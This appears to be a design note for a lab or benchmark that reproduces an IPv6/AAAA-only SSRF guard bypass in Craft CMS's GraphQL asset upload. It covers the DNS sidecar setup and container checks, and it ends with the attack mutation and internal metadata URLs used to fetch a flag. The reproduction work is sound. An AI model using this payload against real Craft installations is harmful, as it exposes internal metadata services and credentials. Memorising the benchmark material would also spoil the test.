## DEDUP verdict vs craft-cms-cve-2026-27127 (DISTINCT -> built)
  Same original CVE (CVE-2025-68437) and same sink (GraphQL Asset save `_file.url` -> validateHostname
  guard), but a DIFFERENT bypass class:
    - CVE-2026-27127 = DNS-rebinding TOCTOU: the SAME host resolves differently between the guard's
      gethostbyname CHECK and Guzzle's FETCH (temporal check-vs-fetch gap). Fixed by a4cf3fb.
    - CVE-2026-27129 = STATIC IPv4-only-resolver blind spot: PHP gethostbyname() does an A-record-only
      lookup, so an AAAA-only host makes it return the hostname STRING, which never matches the numeric
      IPv4 blocklist. No rebind, no race, single resolution. Fixed by a SEPARATE commit (2825388) adding
      IPv6-prefix blocking to validateIp. => genuinely distinct case.

## The IPv4-only-resolver blind spot (CVE-2026-27129 root cause)
  V1 (5.8.22) validateHostname() calls gethostbyname($host). PHP/glibc gethostbyname performs an
  IPv4-only (A-record) lookup. For a host with ONLY an AAAA record and NO A record, the lookup fails
  and PHP returns the *input hostname string* unchanged. in_array('host6.pcb.test', [<numeric IPv4 list>])
  is false, so the guard passes. Guzzle/libcurl then resolves the host via getaddrinfo (which sees the
  AAAA) and connects over IPv6 to the metadata endpoint. V2 (5.8.23) closes it by validating the IP
  libcurl actually connected to (RequestOptions::ON_STATS -> primary_ip) against an IPv6-prefix blocklist.

## Making the blind spot REAL (dns_server.py + dual-stack Docker net)
  A tiny static UDP DNS sidecar (192.0.0.53) answers:
    seed.pcb.test   A -> 192.0.0.192   AAAA -> NODATA          (CVE-2025-68437 seed; static IPv4 metadata)
    host6.pcb.test  A -> NODATA         AAAA -> fd00:ec2::254   (CVE-2026-27129 residual; AAAA-only)
  Answering host6's A as NODATA (RCODE 0, name exists, 0 answers) — NOT NXDOMAIN — is essential: it
  makes gethostbyname fail cleanly (PHP returns the string) while getaddrinfo still resolves the AAAA.
  The compose network is dual-stack (192.0.0.0/24 + fd00:ec2::/64, enable_ipv6) and the canary binds a
  dual-stack socket (AF_INET6 + IPV6_V6ONLY=0), so both the IPv4 seed hit (192.0.0.192) and the IPv6
  residual hit (fd00:ec2::254) reach the SAME flag server. craft-entrypoint.sh points resolv.conf
  straight at the sidecar (MariaDB is reached by STATIC IP so the DB never queries it).

## In-container primitive check (real Docker)
  v1: gethostbyname("host6.pcb.test") = "host6.pcb.test"                       (AAAA-only quirk; string, not an IP)
  v1: php curl http://[fd00:ec2::254]/ -> body=<FLAG>  primary_ip=fd00:ec2::254 (real IPv6 connect works)

## Attack channel (SSRF-sidecar, same sink for both vectors — Variant A)
  POST /index.php?p=actions/graphql/api   (Authorization: Bearer pcb_gql_token_ssrf_ipv6_0001)
    mutation { save_pcbvol_Asset(_file:{url:"<URL>", filename:"pcb_xxx.txt"}) { id url filename } }
  Craft's handleUpload() runs validateHostname() then the Guzzle fetch of <URL>; the fetched bytes are
  stored as an asset. Observable = GET the returned asset url; the ${PCB_FLAG} token appears iff the
  server-side fetch reached the internal metadata canary (SSRF succeeded).
    seed     (CVE-2025-68437): url=http://seed.pcb.test/flag    (A -> 192.0.0.192, IPv4 metadata)
    residual (CVE-2026-27129): url=http://host6.pcb.test/flag   (A NODATA, AAAA -> fd00:ec2::254)

